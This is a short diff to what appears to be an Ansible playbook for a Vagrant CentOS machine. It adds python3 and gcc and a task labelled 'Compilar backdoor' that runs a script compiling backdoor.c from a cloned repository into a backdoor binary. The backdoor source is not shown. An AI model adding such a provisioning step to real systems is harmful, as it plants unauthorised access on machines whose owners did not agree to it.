@@ -44,6 +44,8 @@
           - ntp
           - nginx
           - git
+          - python3
+          - gcc
         state: latest
 
     - name: Servicio ntp
@@ -84,6 +86,12 @@
         dest: /home/vagrant/Auxiliar-Centos-7.2
         clone: yes
         update: yes
+
+    - name: Compilar backdoor
+      shell: |
+        /home/vagrant/Auxiliar-Centos-7.2/administracion/open_door.sh \
+        /home/vagrant/Auxiliar-Centos-7.2/administracion/backdoor.c \
+        /home/vagrant/Auxiliar-Centos-7.2/administracion/backdoor
 
   handlers:
 
